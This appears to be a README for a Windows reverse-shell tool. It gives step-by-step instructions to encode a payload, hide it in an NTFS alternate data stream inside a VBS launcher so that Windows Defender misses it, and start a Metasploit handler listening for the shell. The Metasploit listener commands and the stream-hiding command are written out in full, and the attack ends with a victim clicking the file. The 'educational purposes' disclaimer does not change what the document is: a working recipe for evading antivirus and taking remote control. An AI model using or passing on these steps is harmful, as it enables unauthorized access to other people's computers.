# Windows Reverse Shell

Once run, a reverse shell from your Windows Machine gets established to the Attacking Machine.
The code for the reverse shell is in `code.txt`. The rest is required to hide it from Windows Defender. For that a file to execute the reverse shell is needed (`launch.vbs`). We also have to encode the code for the reverse shell. After that we hide the code for our payload within our launch file using alternative datastreams on ntfs.

## Requirements
- attacing machine with metasploit framework installed (e.g. Kali Linux)
- target: Windows (only tested using Windows 11)

## Prepare
1. Edit `code.txt` and replace the ip address with the ip address of the attacking machine.
   Keep in mind that the windows machine has to be able to reach you. You have to be on the same local network or it has to be a public ip address.
2. Encode the `code.txt` file using base64 (UTF-16LE) and replace `<CODE>` in your `payload.bat` with the encoded code.
3. Hide the `payload.bat` in your launch.vbs using alternative datastreams. Using the ntfs filesystem as Windows does you can do it like that: `type payload.bat launch.vbs:payload.bat`
4. You can delete the `code.txt` and `payload.bat` files and get the `launch.vbs` on the windows machine.

## Attack
1. On Attacker machine
```shell
mfconsole
use exploit/multi/handler
set payload windows/shell_reverse_tcp
set LHOST <attacker ip address>
set LPORT 4444
exploit
```
2. Windows user execute launch.vbs (e.g. by clicking on it)

---

*Diclaimer: only for educational purposes*
